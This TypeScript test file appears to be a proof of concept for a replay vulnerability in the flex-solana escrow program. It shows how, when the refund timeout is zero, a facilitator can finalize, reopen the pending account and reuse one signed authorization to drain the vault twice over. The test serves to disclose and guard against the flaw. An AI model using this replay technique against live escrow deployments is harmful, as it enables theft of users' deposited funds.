import { describe, it, expect, beforeAll } from "bun:test";
import { generateKeyPairSigner, type KeyPairSigner } from "@solana/kit";
import { fetchEscrowAccount } from "@faremeter/flex-solana";
import {
  createRpc,
  fundKeypair,
  defined,
  createFundedTokenAccount,
  setupEscrowForAuth,
  submitAuthorizationHelper,
  finalizeHelper,
  fetchTokenBalance,
} from "./helpers";

// Demonstrates a replay attack when refund_timeout_slots is zero.
//
// Replay protection relies on the pending PDA remaining alive until the signed
// authorization has expired. For non-zero refund windows, ExpiryTooFar bounds
// expires_at_slot to submitted_at_slot + refund_timeout_slots, and finalize
// cannot close the pending PDA before that slot. By the time finalize runs,
// the authorization is already expired and cannot be resubmitted.
//
// When refund_timeout_slots == 0, finalize can close the pending PDA while the
// authorization is still valid. The ExpiryTooFar check is skipped (the bound
// degenerates to clock.slot + 0, which conflicts with the validity requirement
// clock.slot < expires_at_slot), so no expiry bound is enforced. The
// facilitator can finalize immediately, closing the PDA, then resubmit the
// same signed authorization to re-create it and drain the vault.

describe("zero refund timeout replay attack", () => {
  const rpc = createRpc();
  let owner: KeyPairSigner;
  let facilitator: KeyPairSigner;
  let payer: KeyPairSigner;

  beforeAll(async () => {
    owner = await generateKeyPairSigner();
    facilitator = await generateKeyPairSigner();
    payer = await generateKeyPairSigner();
    await fundKeypair(rpc, owner);
    await fundKeypair(rpc, facilitator);
    await fundKeypair(rpc, payer);
  });

  it("drains vault by replaying the same authorization after finalization", async () => {
    const depositAmount = 1_000_000;
    const settleAmount = 500_000;

    const { escrowPDA, mint, vaultPDA, sessionKey, sessionKeyPDA } =
      await setupEscrowForAuth(rpc, owner, facilitator, payer, 2000, {
        refundTimeoutSlots: 0,
        deadmanTimeoutSlots: 1000,
        depositAmount,
      });

    const recipient = await createFundedTokenAccount(
      rpc,
      mint,
      facilitator.address,
      payer,
      0n,
    );
    const splits = [{ recipient: recipient.address, bps: 10_000 }];

    // Pick an expiry far in the future. With refund_timeout_slots == 0, the
    // ExpiryTooFar guard is skipped, so this is accepted.
    const currentSlot = await rpc.getSlot().send();
    const expiresAtSlot = currentSlot + 10_000n;

    // --- First submission: authorization_id=1 for 500,000 tokens ---

    const pendingPDA = await submitAuthorizationHelper(
      rpc,
      escrowPDA,
      facilitator,
      sessionKey,
      sessionKeyPDA,
      mint,
      vaultPDA,
      1,
      settleAmount,
      splits,
      { refundTimeoutSlots: 0, expiresAtSlot },
    );

    // Finalize immediately — refund window is submitted_at_slot + 0, so it
    // passes in the same slot. This closes the pending PDA.
    await finalizeHelper(
      rpc,
      facilitator,
      escrowPDA,
      facilitator.address,
      pendingPDA,
      vaultPDA,
      [recipient.address],
    );

    const recipientAfterFirst = await fetchTokenBalance(rpc, recipient.address);
    expect(recipientAfterFirst).toBe(BigInt(settleAmount));

    const vaultAfterFirst = await fetchTokenBalance(rpc, vaultPDA);
    expect(vaultAfterFirst).toBe(BigInt(depositAmount - settleAmount));

    const escrowAfterFirst = defined(await fetchEscrowAccount(rpc, escrowPDA));
    expect(escrowAfterFirst.pendingCount).toBe(0);

    // --- Replay: resubmit the SAME authorization_id with the same signature ---
    //
    // The pending PDA was closed by finalize, so Anchor's init constraint
    // allows re-creation at the same address. The signed message is identical
    // (same escrow, mint, maxAmount, authorizationId, expiresAtSlot, splits),
    // so the same Ed25519 signature is valid.

    const replayPendingPDA = await submitAuthorizationHelper(
      rpc,
      escrowPDA,
      facilitator,
      sessionKey,
      sessionKeyPDA,
      mint,
      vaultPDA,
      1,
      settleAmount,
      splits,
      { refundTimeoutSlots: 0, expiresAtSlot },
    );

    // The replayed pending PDA has the same address (same seeds).
    expect(replayPendingPDA).toBe(pendingPDA);

    // Finalize the replay immediately.
    await finalizeHelper(
      rpc,
      facilitator,
      escrowPDA,
      facilitator.address,
      replayPendingPDA,
      vaultPDA,
      [recipient.address],
    );

    // --- Verify the damage ---
    //
    // The recipient has received 1,000,000 tokens total — twice the 500,000
    // that was authorized by a single signed message. The vault is empty.

    const recipientFinal = await fetchTokenBalance(rpc, recipient.address);
    expect(recipientFinal).toBe(BigInt(depositAmount));

    const vaultFinal = await fetchTokenBalance(rpc, vaultPDA);
    expect(vaultFinal).toBe(0n);

    const escrowFinal = defined(await fetchEscrowAccount(rpc, escrowPDA));
    expect(escrowFinal.pendingCount).toBe(0);
  }, 30_000);
});
